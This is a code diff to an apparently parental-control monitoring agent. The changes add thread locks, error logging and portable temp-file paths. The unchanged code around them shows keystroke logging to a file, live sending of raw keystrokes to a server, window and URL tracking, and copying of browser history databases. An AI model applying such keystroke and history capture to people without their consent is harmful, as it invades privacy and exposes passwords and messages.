@@ -17,6 +17,7 @@ THREAT_KEYWORDS.extend(ADULT_KEYWORDS)
 
 import json
 import os
+import tempfile
 
 CHECK_INTERVAL_SECONDS = 5
 KEYLOG_FILE = "keylog.txt"
@@ -70,6 +71,10 @@ class ThreatAgent:
         self.max_daily_minutes = 120
         self.rules_active = True
         self.screen_time_exceeded = False
+
+        # Thread safety locks
+        self._file_lock = threading.Lock()
+        self._browser_lock = threading.Lock()
 
         # Smart Filtering Data
         self.domains_db = {}
@@ -340,8 +345,9 @@ class ThreatAgent:
             else:
                 char_to_log = f"[{key.name.upper()}]"
 
-            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
-                f.write(char_to_log)
+            with self._file_lock:
+                with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
+                    f.write(char_to_log)
 
             if self.sio.connected:
                 self.sio.emit('raw_keystroke', {
@@ -607,8 +613,8 @@ class ThreatAgent:
                 if result:
                     window_title = result
 
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"macOS window tracking error: {e}")
 
         if url:
             logger.info(f"URL Captured: [{app_name}] {url}")
@@ -635,8 +641,8 @@ class ThreatAgent:
                     ps_result = subprocess.run(['ps', '-p', pid, '-o', 'comm='],
                                             capture_output=True, text=True, timeout=3)
                     app_name = ps_result.stdout.strip() or "Unknown"
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Linux window tracking error: {e}")
         return app_name, window_title, url
 
     # =============================================
@@ -691,7 +697,7 @@ class ThreatAgent:
                 latest_time = 0
 
                 for hist_path in history_paths:
-                    tmp_copy = "/tmp/_chrome_hist_copy.db"
+                    tmp_copy = os.path.join(tempfile.gettempdir(), '_chrome_hist_copy.db')
                     try:
                         shutil.copy2(hist_path, tmp_copy)
                         with sqlite3.connect(tmp_copy) as conn:
@@ -721,12 +727,13 @@ class ThreatAgent:
         """Scan ALL running browsers for URLs — cross-platform."""
         now = time.time()
 
-        if CURRENT_OS == "Darwin":
-            self._scan_browsers_macos(now)
-        elif CURRENT_OS == "Windows":
-            self._scan_browsers_windows(now)
-        elif CURRENT_OS == "Linux":
-            self._scan_browsers_linux(now)
+        with self._browser_lock:
+            if CURRENT_OS == "Darwin":
+                self._scan_browsers_macos(now)
+            elif CURRENT_OS == "Windows":
+                self._scan_browsers_windows(now)
+            elif CURRENT_OS == "Linux":
+                self._scan_browsers_linux(now)
 
     def _scan_browsers_macos(self, now):
         """macOS: Scan browsers using AppleScript."""
@@ -856,7 +863,7 @@ class ThreatAgent:
             latest_time = 0
 
             for hist_path in history_paths:
-                tmp_copy = "/tmp/_guardian_hist_copy.db"
+                tmp_copy = os.path.join(tempfile.gettempdir(), '_guardian_hist_copy.db')
                 try:
                     shutil.copy2(hist_path, tmp_copy)
                     with sqlite3.connect(tmp_copy) as conn:
